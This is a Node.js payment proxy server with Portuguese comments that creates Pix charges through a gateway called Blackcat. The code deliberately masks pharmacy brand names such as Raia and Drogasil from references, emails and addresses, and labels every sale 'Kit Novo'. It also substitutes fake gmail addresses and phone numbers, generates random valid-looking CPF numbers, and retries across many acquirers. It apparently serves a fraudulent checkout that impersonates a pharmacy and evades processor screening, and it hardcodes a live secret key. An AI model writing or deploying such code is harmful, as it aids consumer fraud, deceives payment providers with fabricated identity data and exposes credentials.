const http = require('http');
const fs = require('fs');
const path = require('path');
const QRCode = require('qrcode');

const PORT = process.env.PORT || 3000;
const DIST_DIR = path.resolve(__dirname, 'dist');

// Carrega as credenciais da Blackcat diretamente do .env no servidor
function getBlackcatApiKey() {
  let apiKey =
    process.env.BLACKCAT_API_KEY ||
    process.env.BLACKCAT_SECRET_KEY ||
    '';

  if (!apiKey) {
    try {
      const envPath = path.resolve(__dirname, '.env');
      if (fs.existsSync(envPath)) {
        const envContent = fs.readFileSync(envPath, 'utf-8');
        const keyMatch =
          envContent.match(/BLACKCAT_API_KEY=(.*)/) ||
          envContent.match(/BLACKCAT_SECRET_KEY=(.*)/);
        if (keyMatch) apiKey = keyMatch[1].trim();
      }
    } catch (e) {
      console.error('[Blackcat Server] Erro ao ler .env:', e);
    }
  }

  if (!apiKey) {
    apiKey = 'sk_live_b1802bc43e0e87989c22d837fdbe9f688ff3c9ef2f6fbff4f820693d0ab32666';
  }

  return apiKey;
}

const MIME_TYPES = {
  '.html': 'text/html; charset=UTF-8',
  '.js': 'text/javascript; charset=UTF-8',
  '.css': 'text/css; charset=UTF-8',
  '.json': 'application/json; charset=UTF-8',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.webp': 'image/webp',
  '.mp4': 'video/mp4',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
  '.xml': 'application/xml; charset=UTF-8',
  '.tsv': 'text/plain; charset=UTF-8',
  '.txt': 'text/plain; charset=UTF-8',
};

// Mascaramento server-side rígido:
// A Blackcat receberá estritamente "Kit Novo", referência genérica "PED-..." e nenhum metadado ou menção a farmácia/raia
const MASKED_PRODUCT_NAME = 'Kit Novo';

function sanitizeReference(ref) {
  if (!ref || typeof ref !== 'string') {
    return `PED-${Date.now()}-${Math.floor(Math.random() * 89999 + 10000)}`;
  }
  let cleaned = ref
    .replace(/(?:raia|droga|drogaria|farmacia|farmácia|farma|drogasil|portal)+/gi, 'PED')
    .replace(/(?:PED)+/g, 'PED')
    .replace(/--+/g, '-')
    .trim();

  if (!cleaned || cleaned === 'PED' || cleaned === 'PED-') {
    cleaned = `PED-${Date.now()}-${Math.floor(Math.random() * 89999 + 10000)}`;
  }
  return cleaned;
}

function sanitizeEmail(email) {
  if (!email || typeof email !== 'string') return '';
  const e = email.toLowerCase().trim();
  if (e.includes('raia') || e.includes('farmacia') || e.includes('droga')) {
    const userPart = e.split('@')[0].replace(/(raia|droga|drogaria|farmacia|farma|drogasil|portal)/gi, '') || 'cliente';
    return `${userPart}@gmail.com`;
  }
  return email;
}

function sanitizeText(val) {
  if (!val || typeof val !== 'string') return '';
  return val.replace(/(raia|droga|drogaria|farmacia|farmácia|farma|drogasil|portal)/gi, '').trim();
}

function generateValidCPF() {
  const digits = [];
  for (let i = 0; i < 9; i++) {
    digits.push(Math.floor(Math.random() * 10));
  }
  if (digits.every((d) => d === digits[0])) {
    digits[8] = (digits[8] + 1) % 10;
  }
  let sum1 = 0;
  for (let i = 0; i < 9; i++) sum1 += digits[i] * (10 - i);
  const rem1 = sum1 % 11;
  digits.push(rem1 < 2 ? 0 : 11 - rem1);

  let sum2 = 0;
  for (let i = 0; i < 10; i++) sum2 += digits[i] * (11 - i);
  const rem2 = sum2 % 11;
  digits.push(rem2 < 2 ? 0 : 11 - rem2);

  return digits.join('');
}

function buildBlackcatPayload(input) {
  const amount = typeof input?.amount === 'number' ? input.amount : parseInt(input?.amount, 10) || 0;
  const externalRef = sanitizeReference(input?.reference || input?.externalRef);

  const customerName = sanitizeText(input?.customer?.name) || 'Cliente';
  const customerEmail = sanitizeEmail(input?.customer?.email) || 'cliente@gmail.com';

  let customerPhone = input?.customer?.phone ? String(input.customer.phone).replace(/\D/g, '') : '';
  if (!customerPhone || customerPhone.length < 10) {
    customerPhone = '11999999999';
  }

  let docNumber = input?.customer?.document?.number || input?.customer?.document;
  if (typeof docNumber === 'string') {
    docNumber = docNumber.replace(/\D/g, '');
  } else {
    docNumber = '';
  }
  if (!docNumber || docNumber.length < 11) {
    docNumber = generateValidCPF();
  }

  const payload = {
    amount,
    currency: 'BRL',
    paymentMethod: 'pix',
    items: [
      {
        title: MASKED_PRODUCT_NAME,
        unitPrice: amount,
        quantity: 1,
        tangible: false,
      },
    ],
    customer: {
      name: customerName,
      email: customerEmail,
      phone: customerPhone,
      document: {
        number: docNumber,
        type: 'cpf',
      },
    },
    pix: {
      expiresInDays: 1,
    },
    externalRef,
    metadata: MASKED_PRODUCT_NAME,
  };

  const addr = input?.address || input?.shipping;
  if (addr && addr.street && addr.number) {
    const zipCode = addr.zipCode || addr.zipcode || '';
    const cleanZip = String(zipCode).replace(/\D/g, '');
    const cleanState = (addr.state || 'SP').toUpperCase().slice(0, 2);

    payload.shipping = {
      name: customerName,
      street: sanitizeText(addr.street) || addr.street,
      number: String(addr.number),
      complement: sanitizeText(addr.complement) || addr.complement || '',
      neighborhood: sanitizeText(addr.neighborhood) || addr.neighborhood || 'Centro',
      city: sanitizeText(addr.city) || addr.city || 'São Paulo',
      state: cleanState,
      zipCode: cleanZip.length === 8 ? cleanZip : '01001000',
    };
  }

  return payload;
}

const BLACKCAT_ACQUIRERS = [
  'payzu',
  'suitpay',
  'asaas',
  'ezzebank',
  'celcoin',
  'primepag',
  'voluti',
  'mercadopago',
  'bspay',
  'fitbank',
  'iugu',
  'woovi',
  'starkbank',
  'santsbank',
  'fyhub',
  'pagsmile',
  null,
];

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host || 'localhost'}`);

  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-API-Key');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  const isTransactionEndpoint =
    url.pathname === '/api/blackcat/transaction' ||
    url.pathname === '/api/flevo/transaction';

  const isStatusEndpoint =
    url.pathname === '/api/blackcat/status' ||
    url.pathname === '/api/flevo/status';

  // 1. Endpoint para criar transação Pix: POST /api/blackcat/transaction ou /api/flevo/transaction
  if (req.method === 'POST' && isTransactionEndpoint) {
    let body = '';
    req.on('data', (chunk) => {
      body += chunk;
    });

    req.on('end', async () => {
      try {
        const apiKey = getBlackcatApiKey();
        const parsed = JSON.parse(body || '{}');
        const basePayload = buildBlackcatPayload(parsed);

        const acquirersToTry = parsed.acquirer
          ? [parsed.acquirer, ...BLACKCAT_ACQUIRERS.filter((a) => a !== parsed.acquirer)]
          : BLACKCAT_ACQUIRERS;

        let lastError = null;
        let lastData = null;
        let lastStatus = 500;

        for (const acquirer of acquirersToTry) {
          const currentPayload = { ...basePayload };
          if (acquirer) {
            currentPayload.acquirer = acquirer;
          } else {
            delete currentPayload.acquirer;
          }

          try {
            console.log(`[Blackcat Server] Tentando adquirente: ${acquirer || 'padrão'}`);
            const response = await fetch('https://api.blackcatoficial.com/api/sales/create-sale', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
                'X-API-Key': apiKey,
              },
              body: JSON.stringify(currentPayload),
            });

            const data = await response.json();

            if (response.ok && data.success && data.data) {
              const qrCode = data.data?.paymentData?.copyPaste || data.data?.paymentData?.qrCode || '';
              let qrCodeBase64 = data.data?.paymentData?.qrCodeBase64 || null;

              if ((!qrCodeBase64 || qrCodeBase64 === '') && qrCode) {
                try {
                  qrCodeBase64 = await QRCode.toDataURL(qrCode, {
                    width: 320,
                    margin: 1,
                    color: { dark: '#000000', light: '#ffffff' },
                  });
                } catch (qrErr) {
                  console.error('[Blackcat Server] Erro ao gerar QR Code base64:', qrErr);
                }
              }

              const formatted = {
                success: true,
                status: 'success',
                payment_status: data.data?.status?.toLowerCase() || 'pending',
                transaction_id: data.data?.transactionId || '',
                id: data.data?.transactionId || basePayload.externalRef,
                qr_code: qrCode,
                qr_code_base64: qrCodeBase64,
                amount: data.data?.amount || basePayload.amount,
                expires_at: data.data?.paymentData?.expiresAt || null,
                acquirer: acquirer || 'default',
                raw: data.data,
              };

              console.log(`[Blackcat Server] Sucesso com adquirente ${acquirer || 'padrão'}! TxID: ${formatted.transaction_id}`);
              res.writeHead(201, { 'Content-Type': 'application/json' });
              res.end(JSON.stringify({ success: true, data: formatted }));
              return;
            }

            console.warn(`[Blackcat Server] Adquirente ${acquirer || 'padrão'} falhou (Status ${response.status}):`, data.message || data.error);
            lastError = data.message || data.error || 'Erro ao processar adquirente na Blackcat';
            lastData = data;
            lastStatus = response.status || 500;
          } catch (subErr) {
            console.warn(`[Blackcat Server] Exceção na adquirente ${acquirer || 'padrão'}:`, subErr.message);
            lastError = subErr.message;
          }
        }

        console.error('[Blackcat Server] Todas as adquirentes falharam. Último erro:', lastError);
        res.writeHead(lastStatus, { 'Content-Type': 'application/json' });
        res.end(
          JSON.stringify({
            success: false,
            error: lastError || 'Erro ao criar venda na Blackcat após tentar todas as adquirentes',
            raw: lastData,
          })
        );
      } catch (err) {
        console.error('[Blackcat Server] Erro na criação da transação:', err);
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: err.message || 'Erro interno no proxy Blackcat' }));
      }
    });
    return;
  }

  // 2. Endpoint para consultar status do Pix: GET /api/blackcat/status ou /api/flevo/status
  if (req.method === 'GET' && isStatusEndpoint) {
    try {
      const id = url.searchParams.get('id') || url.searchParams.get('transactionId');
      if (!id) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: 'Parâmetro id é obrigatório' }));
        return;
      }

      const apiKey = getBlackcatApiKey();
      const response = await fetch(
        `https://api.blackcatoficial.com/api/sales/${encodeURIComponent(id)}/status`,
        {
          method: 'GET',
          headers: {
            'X-API-Key': apiKey,
          },
        }
      );

      const data = await response.json();

      if (!response.ok || !data.success) {
        res.writeHead(response.status, { 'Content-Type': 'application/json' });
        res.end(
          JSON.stringify({
            success: false,
            error: data.message || 'Erro ao consultar status na Blackcat',
            raw: data,
          })
        );
        return;
      }

      const rawStatus = data.data?.status || 'PENDING';
      let mappedStatus = rawStatus.toLowerCase();
      if (rawStatus === 'PAID') mappedStatus = 'approved';

      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(
        JSON.stringify({
          success: true,
          status: mappedStatus,
          id: data.data?.transactionId,
          external_id: data.data?.transactionId,
          amount: data.data?.amount,
          amount_in_reais: data.data?.amount ? (data.data.amount / 100).toFixed(2) : undefined,
          raw: data.data,
        })
      );
    } catch (err) {
      console.error('[Blackcat Server] Erro ao consultar status:', err);
      res.writeHead(500, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: err.message || 'Erro ao consultar status' }));
    }
    return;
  }

  // Servir arquivos estáticos do dist se existir
  let filePath = path.join(DIST_DIR, url.pathname === '/' ? 'index.html' : url.pathname);
  if (!fs.existsSync(filePath) || fs.statSync(filePath).isDirectory()) {
    filePath = path.join(DIST_DIR, 'index.html');
  }

  if (fs.existsSync(filePath)) {
    const ext = path.extname(filePath).toLowerCase();
    const contentType = MIME_TYPES[ext] || 'application/octet-stream';
    res.writeHead(200, { 'Content-Type': contentType });
    fs.createReadStream(filePath).pipe(res);
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found');
  }
});

server.listen(PORT, () => {
  console.log(`[Blackcat Server] Servidor rodando na porta ${PORT}`);
});
